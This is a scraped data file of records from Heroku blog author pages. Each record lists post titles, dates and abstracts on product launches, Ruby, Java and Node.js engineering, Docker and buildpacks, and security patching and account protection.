{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "LinkedIn", "Khushboo Goel"], "link": "https://blog.heroku.com/authors/khushboo-goel-heroku-com", "abstract": "Improving the SSO Experience: CLI Login and Certificate Management news December 05, 2018 Khushboo Goel We are happy to announce two major improvements to our SSO experience for Heroku Enterprise customers: easier SSO login for users via the Heroku CLI, and the ability for admins to add more than one certificate at the Enterprise Team level. Logging into all your different cloud applications can be a pain. We know that many of you like to use Heroku via the command line interface and in your web browser side-by-side, and until now that has meant logging in via SSO separately to each interface. You'll now be redirected from the CLI to the Dashboard to complete your SSO login to Heroku, after which your SSO credentials will be synced. We've also made the administrative experience for... Read more", "date": "2018-12-05,"},
{"website": "Heroku", "title": null, "author": ["Email", "Kevin Thompson"], "link": "https://blog.heroku.com/authors/kevin-thompson", "abstract": "Preparing for Major Response engineering July 29, 2015 Kevin Thompson Earlier this month, the OpenSSL project team announced that three days later it would be releasing a new version of OpenSSL to address a high-severity security defect. In the end, this vulnerability resulted in another non-event for our customers , but we thought it might be useful and informative to share the process we went through to prepare for the issue. Triage The announcement from the OpenSSL project team only said that a vulnerability would be patched, but kept the specifics of the vulnerability embargoed to limit the likelihood of an attack before they could release their patch. Obviously, it’s difficult to gauge the potential impact of a vulnerability when you don’t know the... Read more", "date": "2015-07-29,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "Facebook", "GitHub", "LinkedIn", "Kenneth Reitz", "Kenneth Reitz"], "link": "https://blog.heroku.com/authors/kenneth-reitz", "abstract": "Django 1.9's Improvements for Postgres news February 24, 2016 Kenneth Reitz A big update to the beloved Python web framework known as Django was released recently: Django 1.9 . This release contains a long list of improvements for everything from the graphical styling of the admin to the ability to run your test suite in parallel. Our favorite improvements to the framework were, of course, all about our favorite database: Postgres. Here are some of the highlights from the official release notes (highly recommended reading). Renamed PostgreSQL Back-end Django's fantastic built-in Postgres database back-end received a nice name change. Previously known as django.db.backends.postgresql_psycopg2 , the back-end will now be officially available as the much easier... Read more Presenting the Heroku Dashboard news September 17, 2012 Kenneth Reitz Here at Heroku, we focus our energy on developer experience and productivity. Historically, this has revolved around command-line tools like the Heroku Toolbelt . As a polyglot platform, we have developers that come from all backgrounds — some that prefer command-line workflows and others that prefer web interface. Most use a bit of both. Today, we're introducing a new first-class interface to our platform: the Heroku Dashboard . App Awareness and Discoverability The new Heroku Dashboard features a fresh look and feel, optimized for readability and workflow efficiency. The more apps you deploy to Heroku, the harder keeping track of them becomes. With Dashboard, you can instantly... Read more", "date": "2016-02-24,"},
{"website": "Heroku", "title": null, "author": ["Keith Rarick", "Keith Rarick"], "link": "https://blog.heroku.com/authors/keith-rarick", "abstract": "Cedar is the Default Heroku Stack news June 20, 2012 Keith Rarick The Heroku Cedar stack went public beta last year with a series of blog posts . Since then, over 80,000 developers have deployed over 4.5 million times, to apps written in dozens of different programming languages and frameworks. Today, over 75 percent of Heroku app development activity is on the Cedar stack. Production apps like Banjo , Rapportive , PageLever , do.com , and Project Zebra run on Cedar; some of these serve hundreds of millions or even billions of requests per month. Cedar features a streamlined HTTP stack allowing for advanced HTTP capabilities, heroku run for execution of arbitrary one-off dynos , Procfile and the process model for execution of any type of worker process. Most... Read more Cedar Goes GA news May 24, 2012 Keith Rarick As of today, the Cedar stack is now in general availability. Cedar features a streamlined HTTP stack allowing for advanced HTTP capabilities, heroku run for execution of arbitrary one-off dynos , Procfile and the process model for execution of any type of worker process. Most importantly, Cedar is a polyglot platform with official support for Clojure, Java, Node.js, Python, Ruby, and Scala, and extensibility for unlimited others via buildpacks . The Dev Center team has spent the last few months “Cedar-izing” our developer documentation, so now most articles describe use of Heroku on the Cedar platform. ( Aspen and Bamboo remain documented in their own section.) Cedar is the most powerful,... Read more", "date": "2012-06-20,"},
{"website": "Heroku", "title": null, "author": ["Katie Boysen", "Katie Boysen", "Katie Boysen"], "link": "https://blog.heroku.com/authors/katie-boysen", "abstract": "#WIT: Inspiring the World’s Next Generation of Female Leaders in Tech news April 30, 2015 Katie Boysen At Heroku and at Salesforce, we’re always looking for ways we can help increase the number of young women with access to careers in science, technology, engineering and math. Recently, thanks to a Heroku engineering manager’s involvement on this issue with a local school, we hosted a Technovation Challenge event at the Heroku offices. We wanted to share the story about this great program - the Technovation Challenge is an annual competition, and you could do something similar in your community! Some background For the past 3 years, Heroku engineering manager Margaret Le has mentored a group of high school girls at the Immaculate Conception Academy (ICA), a San Francisco high school... Read more Ethos Solutions and Heroku: Building the Internet of GRILLED Things news February 11, 2015 Katie Boysen At Heroku, we love telling the stories of what our customers and partners build on the platform. We love it even more when we get a chance to talk to the development team behind a successful app. So we were excited to sit down with Steve Simpson, CTO of Ethos Solutions—a Heroku partner —to discuss how his team built the award-winning app and intelligence behind the Lynx SmartGrill . Congratulations on your success working with Lynx on the SmartGrill project! Can you tell me a little about the SmartGrill app and how it helps its users? The SmartGrill app is a native iOS and Android application that allows users to browse and cook recipes created specifically for their SmartGrill by... Read more How Branch Uses Heroku news October 21, 2013 Katie Boysen Editor's Note: This is a guest post from Hursh Agrawal , co-founder of Branch . At Branch, we’ve been through several feature launches on Branch.com and, more recently, several more on our new site, Potluck . Although it becomes easier, building high-quality, high-traffic web applications still isn’t easy. Here are a few things we’ve learned about hosting our apps on Heroku that have helped keep our latency down and our confidence up. Building on Heroku One thing that has been consistently helpful is not hosting services ourselves. Heroku provides a pretty extensive Add-on Marketplace you can use to get most services you’d need up and running in a matter of minutes. At Branch, we use... Read more", "date": "2015-04-30,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Kathy Simpson"], "link": "https://blog.heroku.com/authors/kathy-simpson", "abstract": "SSO for Heroku Now Generally Available news January 26, 2016 Kathy Simpson Today we’re pleased to announce that SSO for Heroku is generally available for Heroku Enterprise customers. SSO for Heroku supports single sign-on for SAML 2.0 compliant identity providers (IdPs), making it easier for Heroku Enterprise customers to manage identity across various systems. It also simplifies set-up for system administrators, allowing them to focus on managing authentication. Both cloud and on-premise identity providers are supported by SSO for Heroku. As of today, a number of popular commercial IdPs ship with built-in support for SSO for Heroku, including Salesforce Identity, Okta, PingOne and PingFederate. SSO for Heroku is also fully compatible with identity services... Read more", "date": "2016-01-26,"},
{"website": "Heroku", "title": null, "author": ["Email", "Julien Dubois"], "link": "https://blog.heroku.com/authors/julien-dubois", "abstract": "Bootstrapping Your Microservices Architecture with JHipster and Spring news April 21, 2016 Julien Dubois Julien Dubois is the lead developer of JHipster, a Yeoman generator for Spring and AngularJS applications. Julien’s here to show how you can use a generator like JHipster to address some of the design concerns microservices introduce like discovery and routing so you can focus on your core business logic. What is JHipster? JHipster (for Java Hipster) is an Open Source application generator, based on Yeoman. It generates a Spring Boot (that's the Java part) and AngularJS (that's the hipster part) application, with tooling and configuration all set up for you. In this post, you’ll learn how you can use JHipster to generate a microservices stack to address design concerns like... Read more", "date": "2016-04-21,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Julián Duque", "Julián Duque"], "link": "https://blog.heroku.com/authors/julian-duque", "abstract": "Let's Debug a Node.js Application engineering August 03, 2020 Julián Duque There are always challenges when it comes to debugging applications. Node.js' asynchronous workflows add an extra layer of complexity to this arduous process. Although there have been some updates made to the V8 engine in order to easily access asynchronous stack traces, most of the time, we just get errors on the main thread of our applications, which makes debugging a little bit difficult. As well, when our Node.js applications crash, we usually need to rely on some complicated CLI tooling to analyze the core dumps . Read more Let It Crash: Best Practices for Handling Node.js Errors on Shutdown engineering December 17, 2019 Julián Duque This blog post is adapted from a talk given by Julián Duque at NodeConf EU 2019 titled \" Let it crash! .\" Before coming to Heroku, I did some consulting work as a Node.js solutions architect. My job was to visit various companies and make sure that they were successful in designing production-ready Node applications. Unfortunately, I witnessed many different problems when it came to error handling, especially on process shutdown. When an error occurred, there was often not enough visibility on why it happened, a lack of logging details, and bouts of downtime as applications attempted to recover from crashes. Julián: Okay. So, as Brian said, my name is Julián Duque, it will be... Read more", "date": "2020-08-03,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Joy Scharmen"], "link": "https://blog.heroku.com/authors/joy-scharmen", "abstract": "Heroku Behind the Curtain: Patching the glibc Security Hole news March 21, 2016 Joy Scharmen If you’re a developer, it’s unlikely you’ve ever said \"I wish I could spend a whole day patching critical security holes in my infrastructure!\" (If you do, we’re hiring ). And if you’re running a business, it’s unlikely you’ve ever said “Yes! I would like my developers to lose a day’s worth of feature-building on security patches!”. At Heroku, we believe you shouldn’t have to spend the time required to patch, test, and deploy security fixes. Because of that, some of Heroku’s most important features are ones you never see: we keep our platform reliable and secure for your apps so you don’t have to. Recently Google Security and Red Hat both discovered a high severity bug in a... Read more", "date": "2016-03-21,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Jon Mountjoy", "Jon Mountjoy"], "link": "https://blog.heroku.com/authors/jon-mountjoy", "abstract": "Introducing a New How Heroku Works news July 16, 2013 Jon Mountjoy Humans, in their quest for knowledge, have always wanted to know how things work . We sit in our bedrooms, kitchens and garages pulling things apart with eager hands, examining the bits with a glimmer in our eye as our fingers turn them around and around, wondering what they do, how they do what they do–hoping that everything still works without that pretty residual part that no longer seems to fit. Introducing How Heroku Works How Heroku Works follows this well trodden path. It dissects the platform, laying its innards bare upon the table, letting us gather around and look at what's inside. Look here, and see the muscular router pumping packets to and fro. Look there, and see the... Read more The Heroku Changelog news April 17, 2012 Jon Mountjoy The Heroku Changelog is a feed of all public-facing changes to the Heroku runtime platform. While we announce all major new features via the Heroku blog, we're making small improvements all the time. When any of those improvements have any user-visible impact, you'll find them in the changelog. Some recent examples of posts to the changelog include new versions of the Heroku CLI , a new error code , and changes to logging . To get the latest on changes like these, visit the Heroku Changelog , or subscribe via feed or Twitter . Read more", "date": "2013-07-16,"},
{"website": "Heroku", "title": null, "author": ["Email", "Jon Byrum", "Jon Byrum", "Jon Byrum", "Jon Byrum", "Jon Byrum", "Jon Byrum"], "link": "https://blog.heroku.com/authors/jon-byrum", "abstract": "Building Docker Images with heroku.yml Is Generally Available news November 13, 2018 Jon Byrum Last October, we announced the ability for you to deploy pre-built Docker images to Heroku via Container Registry. Today, building Docker images with heroku.yml is generally available; you can now: Use git push heroku master to build your Docker images on Heroku Take advantage of review apps in Docker-based projects For most teams, using containers in production requires you to spend time setting up and maintaining complex infrastructure. By using heroku.yml to build your Docker images, you get the power and flexibility of using Docker to package your app, combined with Heroku’s high-productivity developer experience, container orchestration, an add-ons ecosystem, and managed... Read more Heroku Buildpack Registry: Making Buildpacks Open and Shareable ecosystem October 04, 2018 Jon Byrum Yesterday we announced a major step towards making buildpacks a multi-platform, open standard by contributing to Cloud Native Buildpacks , a Sandbox Project hosted by the Cloud Native Computing Foundation. Today, we are announcing that you can now easily share your buildpacks with the world, by registering them with the Heroku Buildpack Registry. As of this post, the Buildpack Registry contains over 100 buildpacks created by authors like you. Because of your contributions, Heroku developers can easily use languages and frameworks like Meteor, Elixir, and React in their applications. If you’ve created a custom buildpack and wish to share it with the community, visit Dev Center to learn... Read more Container Registry & Runtime GA: Deploy Docker Images to Heroku news October 03, 2017 Jon Byrum In the last few years Docker has emerged as a de facto standard for packaging apps for deployment. Today, Heroku Container Registry and Runtime is generally available, allowing you to deploy your Docker images directly to Heroku. With Container Registry, you get all of the benefits of Docker -- a great local development experience and flexibility to create your own stack -- with the benefits of running on Heroku: maintained infrastructure, container orchestration, routing, the leading add-ons ecosystem, and a world-class security & operations team. To deploy your Docker image to Heroku, simply run one command in the directory of your Dockerfile: $ heroku container:push web ===... Read more Heroku Exec and Language Runtime Metrics GA:  Runtime Debugging on Heroku news September 28, 2017 Jon Byrum We’ve all been there -- you push your code to production and a leak causes memory usage to grow out of control. To determine the root cause of the problem, you need to be able to monitor, inspect, and debug the production application, collecting detailed data at runtime. Today we’re making it even easier to debug your applications on Heroku, with the general availability of Language Runtime Metrics , starting with JVM languages, and Heroku Exec . Language metrics surfaces key indicators of an issue, like garbage collection activity, and heap and non-heap memory usage, on a unified timeline in the Heroku Dashboard. After you’ve identified an issue, you can use Exec to connect to a dyno at... Read more Announcing Release Phase: Automatically Run Tasks Before a New Release is Deployed news June 08, 2017 Jon Byrum You’re using a continuous delivery pipeline because it takes the manual steps out of code deployment. But when a release includes updates to a database schema, the deployment requires manual intervention and team coordination. Typically, someone on the team will log into the database and run the migration, then quickly deploy the new code to production. It's a process rife with deployment risk. Now with Release Phase, generally available today, you can define tasks you need to run before a release is deployed to production. Simply push your code and Release Phase will automatically run your database schema migration, upload static assets to a CDN, or any other task your app needs to... Read more The Heroku-16 Stack is Now Generally Available news April 20, 2017 Jon Byrum Your Heroku applications run on top of a curated stack, containing the operating system and other components needed at runtime. We maintain the stack - updating the OS, the libraries, and ensuring that known security issues are resolved, so that you can focus on writing code. Today we're announcing the general availability of Heroku-16, our curated stack based on Ubuntu 16.04 LTS. In addition to a new base operating system, Heroku-16 is updated with the latest libraries. If you’re a Ruby or Python developer, Heroku-16 includes 15% more development headers at build time, making it easier to compile native packages on Heroku. Finally, Heroku-16 offers a better local development... Read more", "date": "2018-11-13,"},
{"website": "Heroku", "title": null, "author": ["Jonathan Clem"], "link": "https://blog.heroku.com/authors/jonathan-clem", "abstract": "Introducing Production Check news April 26, 2013 Jonathan Clem Entering production is a key transition in your app’s lifecycle; it signals that your app will be delivering value to end users. You are no longer optimizing for testing—you are optimizing for performance and reliability, and there are new factors to consider at this stage. Today we’re announcing Production Check , an enhancement to the Heroku Dashboard that helps ensure that your app is ready to go to production. Production Check tests your app’s configuration against a set of optional—but highly recommended—criteria. It makes it easy to ensure that your app’s configuration lends itself to maximum uptime. Moreover, it ensures that you have tools available for understanding and monitoring... Read more", "date": "2013-04-26,"},
{"website": "Heroku", "title": null, "author": ["John Simone"], "link": "https://blog.heroku.com/authors/john-simone", "abstract": "Git Push Heroku Master: Now 40% Faster news February 11, 2014 John Simone Flow is an important part of software development. The ability to achieve flow during daily work makes software development a uniquely enjoyable profession. Interruptions in your code/test loop make this state harder to achieve. Whether you are running unit tests locally, launching a local webserver, or deploying to Heroku there's always some waiting and some interruption. Every second saved helps you stay in your flow. We’ve been working on reducing the time it takes to build your code on Heroku. Read through this post for details on the process we used to make builds fast, or check out the end result from the graph below: Let's take a look at our process in delivering these... Read more", "date": "2014-02-11,"},
{"website": "Heroku", "title": null, "author": ["Twitter", "GitHub", "LinkedIn", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler", "Jonan Scheffler"], "link": "https://blog.heroku.com/authors/jonan-scheffler", "abstract": "Optimizing Database Performance in Rails engineering April 15, 2019 Jonan Scheffler Setting up a database is a relatively straightforward process (Heroku has an add-on for that ), but getting it to run well in production is sometimes another matter. As your application grows and your data grows along with it, you will likely find a number of performance bottlenecks specifically related to your database, and this post aims to help you diagnose and address those issues when they arise. As with all components of your infrastructure it’s important to have early visibility into the performance characteristics of your database. Watching this data as your application grows will give you a much better chance of spotting performance issues and regressions as they’re introduced. I... Read more Ruby 2.6 Released: Just-In-Time Compilation Is Here engineering December 25, 2018 Jonan Scheffler The Ruby committers have again continued their annual holiday tradition of gifting us a new Ruby version: Ruby 2.6 was released today, including the long awaited Just-In-Time (JIT) compiler that the Ruby team has been working on for more than a year. Just-In-Time compilation requires Ruby to spin up a compiler process on startup, and we're proud to say that this feature is supported today on Heroku thanks to the diligent efforts of our very own Richard Schneeman . We'd also like to thank fellow Herokai Nobuyoshi Nakada for his effort making sure the new JIT works well with all of the officially supported compilers: GCC, Clang and Microsoft Visual C++. Using Ruby 2.6 on Heroku ... Read more MJIT: A Method Based Just-in-time Compiler for Ruby engineering April 12, 2018 Jonan Scheffler I sat down with some Ruby friends in Hiroshima last year to have a conversation about just-in-time compilation for Ruby, specifically the new MJIT method-based implementation. Those of you who are already familiar with JITs and how they work might want to skip directly to the interview , the rest of us are going to hang out for a minute and learn about how things presently work in Ruby, and what it is exactly that the MJIT would change. How does a Ruby program run? Computers don’t speak Ruby or any other high-level language, they only speak machine language. In a compiled language like C++ you use a compiler to convert all of your C++ code into machine language directly before you run... Read more Best of the Blogs: A Heroku Community Tour news September 13, 2017 Jonan Scheffler Heroku is very fortunate to have a strong community of developers that are excited and passionate about our product. Every day we hear from customers who tell us how much easier Heroku has made their lives, and they frequently share stories about interesting technical projects we've helped them bring to life. Our customers love us, and we love them right back. Today we'll take a look at a few blog posts and applications from Heroku users that illustrate what makes our community so special. We hope you enjoy the tour. If you have Heroku stories of your own you'd like to share, we'd love to hear them ! Dynos Spinning Other Dynos with Heroku This article comes to us from ... Read more The Future of Ember.js: An Interview With Tom Dale at EmberConf - Part Two news May 11, 2017 Jonan Scheffler This is the second of a two-part transcript from a recent interview with Tom Dale of Ember.js. In part one we discussed the history and direction of the Ember.js project . Continuing the discussion of the future for Ember.js, this post includes the rest of the interview, primarily focused on the Glimmer.js project. Some of the questions were omitted from these transcriptions for brevity, so we’re also releasing the nearly hour long audio file of the entire interview . Enjoy! Jonan: Let’s talk about Glimmer 2. If I understand correctly it's released now and it entirely supplants Ember. So how are you planning to gracefully sunset the project? Terence: I think locks (Ricardo Mendes)... Read more The History of Ember.js: An Interview With Tom Dale at EmberConf - Part One news May 09, 2017 Jonan Scheffler At EmberConf Terence Lee and I had a chance to sit down with Tom Dale and chat about the history of Ember.js and where it’s headed now, including some details on the newly extracted Glimmer.js rendering engine. This post details a lot of the history of Ember, including some of the motivation that led the framework to what it is today. Watch the blog for the second portion of this interview with all of the details on Glimmer.js. The next post will also include the full audio of the interview, with many questions we opted to omit from the transcription to save valuable bytes. Jonan: So, we're at EmberConf speaking with Tom Dale, who gave a keynote today with some important... Read more Ruby 2.4 Released: Faster Hashes, Unified Integers and Better Rounding news December 25, 2016 Jonan Scheffler The Ruby maintainers continued their annual tradition by gifting us a new Ruby version to celebrate the holiday: Ruby 2.4 is now available and you can try it out on Heroku . Ruby 2.4 brings some impressive new features and performance improvements to the table, here are a few of the big ones: Read more Ruby 3x3: Matz, Koichi, and Tenderlove on the future of Ruby Performance news November 10, 2016 Jonan Scheffler At RubyKaigi I caught up with Matz , Koichi , and Aaron Patterson aka Tenderlove to talk about Ruby 3x3 and our path so far to reach that goal. We discussed Koichi’s guild proposal, just-in-time compilation and the future of Ruby performance. Jonan: Welcome everyone. Today we are doing an interview to talk about new features coming in Ruby 3. I am here with my coworkers from Heroku, Sasada Koichi and Yukihiro Matsumoto, along with Aaron Patterson from GitHub. Jonan: So, last year at RubyKaigi you announced an initiative to speed up Ruby by three times by the release of version three. Tell us more about Ruby 3x3. Matz: In the design of the Ruby language we have been primarily focused on... Read more", "date": "2019-04-15,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Terence Lee", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Joe Kutner", "Joe Kutner"], "link": "https://blog.heroku.com/authors/joe-kutner", "abstract": "Ground Control to Major TOML: Why Buildpacks Use a Most Peculiar Format engineering July 22, 2020 Joe Kutner YAML files dominate configuration in the cloud native ecosystem. They’re used by Kuberentes, Helm, Tekton, and many other projects to define custom configuration and workflows. But YAML has its oddities, which is why the Cloud Native Buildpacks project chose TOML as its primary configuration format. TOML is a minimal configuration file format that's easy to read because of its simple semantics. You can learn more about TOML from the official documentation , but a simple buildpack TOML file looks like this: Read more Using Research Grants to Foster Innovation life February 12, 2020 Joe Kutner As CEO of Disney, Michael Eisner had a policy that any employee could come to his office and pitch an idea . He believed that breaking down hierarchical barriers allowed innovative ideas to come from anywhere, and it worked. Disney invested in many of those pitches, some of which became the kernels for films like The Little Mermaid and Pocahontas . At Heroku, we know our employees are full of innovative ideas waiting for investment. That’s why any engineer can propose a project through a process we call Research Grants. If the proposal is funded, that engineer gets about two weeks to experiment with their idea and create a work product that can lead to innovative new technologies or even... Read more Samurai Duke and the Legend of OpenJDK life July 09, 2019 Joe Kutner What is Duke? No one knows his species or genus. People say he’s a Java Bean or a Software Agent, but all we know for sure is that he reminds us of the more than twenty-year legacy of the Java language and its community. The Java community has such an affinity for Duke that designers have created surfing Duke, astronaut Duke, rockstar Duke, macramé Duke, and of course Heroku’s Samurai Duke. But how can all of these Duke variants exist without violating copyright or trademark laws? After all, Duke represents the language at the middle of one of the fiercest copyright battles in the history of software . The answer, it turns out, can teach us a great deal about how to nurture an open source... Read more Turn Your Code into Docker Images with Cloud Native Buildpacks engineering April 03, 2019 Terence Lee and Joe Kutner When we open-sourced buildpacks nearly seven years ago, we knew they would simplify the application deployment process. After a developer runs git push heroku master , a buildpack ensures the application's dependencies and compilation steps are taken care of as part of the deploy. As previously announced , we've taken the same philosophies that made buildpacks so successful and applied them towards creating Cloud Native Buildpacks (CNB), a standard for turning source code into Docker images without the need for Dockerfiles. In this post, we'll take a look at how CNBs work, how they aim to solve many of the problems that exist with Dockerfile, and how you can use them with the... Read more Ten Ways to Secure your Applications engineering February 21, 2019 Joe Kutner This blog post is adapted from a talk given by Joe Kutner at Devoxx 2018 titled \" 10 Mistakes Hackers Want You to Make .\" Building self-defending applications and services is no longer aspirational--it’s required. Applying security patches, handling passwords correctly, sanitizing inputs, and properly encoding output is now table stakes. Our attackers keep getting better, and so must we. In this blog post, we'll take a look at several commonly overlooked ways to secure your web apps. Many of the examples provided will be specific to Java , but any modern programming language will have equivalent tactics. 1. Ensure dependencies are up-to-date Every year, OWASP , a group of... Read more In the Cloud, No One Can Hear Your OutOfMemoryError engineering October 02, 2017 Joe Kutner Pushing an app to the cloud can feel like launching a probe into space. Once your project is thousands of miles away you can't bang on it with a hammer or replace broken parts when there's a problem. Your debugging efforts must rely on the instrumentation, telemetry, and remote controls included with the app when it was deployed. On Heroku, we've gladly done some of that prep work for you. Two new Heroku features, Heroku Exec and Language Runtime Metrics, improve your production monitoring, inspecting, and debugging experience on the platform. With Heroku Exec, you can create secure TCP and SSH tunnels into a dyno, which facilitate SSH sessions, port forwarding, remote... Read more On the Rise of Kotlin news June 20, 2017 Joe Kutner It’s rare when a highly structured language with fairly strict syntax sparks emotions of joy and delight. But Kotlin, which is statically typed and compiled like other less friendly languages, delivers a developer experience that thousands of mobile and web programmers are falling in love with. The designers of Kotlin, who have years of experience with developer tooling (IntelliJ and other IDEs), created a language with very specific developer-oriented requirements. They wanted a modern syntax, fast compile times, and advanced concurrency constructs while taking advantage of the robust performance and reliability of the JVM. The result, Kotlin 1.0, was released in February 2016 and its... Read more Reactive Ruby: Building Real-time Apps with JRuby and Ratpack news May 24, 2016 Joe Kutner Nothing beats Ruby when it comes to rapid development, quick feedback, and delightful coding. The Ruby runtime and traditional ruby frameworks favor synchronous programming, which makes them easy to use and understand. But microservices and real-time apps require asynchronous programming and non-blocking IO to enable maximum throughput. That's where JRuby comes in. You can build reactive microservices in Ruby using JRuby and frameworks like Ratpack . JRuby interprets Ruby code into Java Virtual Machine (JVM) bytecode to gain the performance and concurrency benefits of Java without writing any Java code or XML. But the performance benefits of the JVM are just the beginning. You can also... Read more Using Netflix Zuul to Proxy your Microservices news March 02, 2016 Joe Kutner A common challenge when building microservices is providing a unified interface to the consumers of your system. The fact that your services are split into small composable apps shouldn’t be visible to users or result in substantial development effort. To solve this problem, Netflix (a major adopter of microservices) created and open-sourced its Zuul proxy server . Zuul is an edge service that proxies requests to multiple backing services. It provides a unified “front door” to your system, which allows a browser, mobile app, or other user interface to consume services from multiple hosts without managing cross-origin resource sharing (CORS) and authentication for each one. You can... Read more The Next Twenty Years of Java: Where We've Been and Where We're Going news June 04, 2015 Joe Kutner 1995 was the year AOL floppy disks arrived in the mail, Netscape Navigator was born and the first public version of Java was released. Over the next two decades, Java witnessed the multi-core revolution, the birth of the cloud, and the rise of polyglot programming. It survived these upheavals by evolving with them, and it continues to evolve even as we celebrate Java's twentieth birthday this year. But the JVM turning twenty doesn’t make it out-of-date. On the contrary, Java's evolution has lead to a kind of renaissance. That's why we sat down with RedMonk earlier this month to discuss Java's past, present, and future on the Opinionated Infrastructure Podcast . Our... Read more Managing your Microservices on Heroku with Netflix's Eureka news March 03, 2015 Joe Kutner Over the past few years, Netflix has open sourced many of the components that make up its production platform . These include Eureka for service discovery, Hystrix for handling service failure, Ribbon for client side load balancing, and many others. These projects are powerful, mature, and benefit from Netflix’s many years of experience deploying service-oriented applications in the cloud . Adding credence to this, IBM , Yelp, Hotels.com and many others have adopted these technologies for their own systems. And there’s nothing stopping you from building them into your applications, too. Well, nothing except that many of the Netflix projects have a high barrier to entry because they're... Read more", "date": "2020-07-22,"},
{"website": "Heroku", "title": null, "author": ["Email", "Twitter", "GitHub", "LinkedIn", "Jessie Young"], "link": "https://blog.heroku.com/authors/jessie-young", "abstract": "Saved by the Schema: Using JSON Schema to Document, Test, and Debug APIs engineering April 09, 2019 Jessie Young Heroku has many public API endpoints. Each of these endpoints needs to be tested so that we know how they work, and documented so that our customers (and other API consumers) know how they work. Follow along, and we’ll learn how Heroku uses JSON Schema to test and document our Platform API – and how it helped us uncover an unexpected bug, rooted in the way the Oj gem parses Big Decimals. JSON Schema files are like blueprints that define the structure and semantics of other JSON documents. When a JSON Schema file is applied to a JSON document, you can determine whether the document is valid (conforms to the schema) or is invalid (does not conform to the schema). So how do we at Heroku use... Read more", "date": "2019-04-09,"},
{"website": "Heroku", "title": null, "author": ["Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen", "Jesper Joergensen"], "link": "https://blog.heroku.com/authors/jesper-joergensen", "abstract": "Announcing PCI Compliance for Heroku Shield news November 02, 2017 Jesper Joergensen In June we announced Heroku Shield with new high compliance features for Heroku Private Spaces. Heroku Shield enables businesses like AlignTech to deploy apps that handle protected healthcare information (PHI) in accordance with government regulations. Today, we are proud to announce that Heroku Shield Services have been validated as PCI Level 1 Service Provider compliant. This designation helps our customers understand how Heroku's systems and human processes work together to safeguard customer data. It helps security and audit teams in choosing Heroku as a platform for running a company's most critical apps. Read more Announcing Heroku Private Space Peering for AWS news November 01, 2017 Jesper Joergensen Two years ago , we introduced Heroku Private Spaces as a new platform abstraction that combines powerful network isolation features with the seamless developer experience of Heroku. Today we are announcing Heroku Private Space Peering , a new capability to connect the isolated Private Space network to apps and services in Amazon VPCs controlled by you. Now you can build apps in Heroku that connect securely and privately to backend systems and workloads in AWS like a directory service, a search stack, a data warehouse, or a legacy SQL database. Read more Introducing Heroku Shield: Continuous Delivery for High Compliance Apps news June 06, 2017 Jesper Joergensen Today we are happy to announce Heroku Shield, a new addition to our Heroku Enterprise line of products. Heroku Shield introduces new capabilities to Dynos, Postgres databases and Private Spaces that make Heroku suitable for high compliance environments such as healthcare apps regulated by the Health Insurance Portability and Accountability Act (HIPAA). With Heroku Shield, the power and productivity of Heroku is now easily available to a whole new class of strictly regulated apps. Read more Introducing Heroku Private Spaces: Private PaaS, delivered as-a-Service news September 10, 2015 Jesper Joergensen As the world becomes more cloud-centric, and more of our apps and business depend on its capabilities, the trust, control and management of cloud services is more important than ever. Since the first days of Heroku — and Platform-as-a-Service in general — many companies have struggled to balance the impact and success of the cloud with the control offered by traditional software and on-premise infrastructure. Too often that balance tips back towards software, with companies choosing to meet those requirements by building and running their own platforms, inevitably becoming frustrated by the resulting complexity, cost and poor experience. Today Heroku is introducing Private Spaces, a new... Read more Introducing Heroku Enterprise: New Features for Teams news February 19, 2015 Jesper Joergensen Apps have transformed how we do almost everything. The ubiquity of mobile devices with millions of available apps mean that today, anyone can pull up an app in seconds to check their car engine , turn on the lights at home or ride a scooter across town . So far, the companies behind these apps have mostly been startups, many of which use Heroku to help them iterate quickly and stay focused on the customer experience instead of wasting time on infrastructure. Today we’re proud to announce Heroku Enterprise , a new edition of Heroku that helps larger companies take advantage of the same technology recipe while meeting their unique needs for more advanced collaboration, better access controls... Read more Introducing the General Availability of Performance Dynos in Europe news December 04, 2014 Jesper Joergensen Since day one, developers from all over the world have been deploying apps on Heroku, and we’re extremely proud of the strong global community we’ve built. Our European customers in particular have asked for the ability to deploy applications geographically close to their European customer base so they can offer a better user experience with more responsive apps. In 2013 we launched 1X and 2X dynos in Europe to meet this demand. Today we’re pleased to announce the general availability of Performance Dynos in our European region. The availability of Performance Dynos in Europe provides the flexibility needed to build and run large-scale, high-performance apps. Performance Dynos are highly... Read more Two-factor Authentication Now Generally Available news September 25, 2014 Jesper Joergensen Two-factor authentication is a powerful and simple way to greatly enhance security for your Heroku account. It prevents an attacker from accessing your account using a stolen password. After a 4 month beta period, we are now happy to make two-factor authentication generally available. Turning on two-factor authentication You can enable and disable two-factor authentication for your Heroku account in the Manage Account section of Dashboard. Before you turn it on, please read on here to understand the risks of account lock-out. You can also refer to the Dev Center docs for more details. How two-factor authentication protects you Without two-factor authentication, an attacker can gain... Read more Introducing Heroku DX: The New Heroku Developer Experience news September 23, 2014 Jesper Joergensen One of our core beliefs at Heroku is that developers do their best work when the development process is as simple, elegant, and conducive to focus and flow as possible. We are grateful for how well many of our contributions to that cause have been received, and today we are making generally available a new set of features that have been inspired by those values. Collectively, we call these new features Heroku DX—the next evolution in Heroku’s developer experience. Our goal with these new features—Heroku Button, Heroku Dashboard + Metrics and Heroku Postgres DbX—is to make it faster than ever for developers to build, launch and scale applications. Heroku Button Heroku is known for... Read more Better Queuing Metrics With Updated New Relic Add-On news February 21, 2013 Jesper Joergensen Today our partner, New Relic , released an update to the Ruby New Relic agent that addresses issues brought up by our 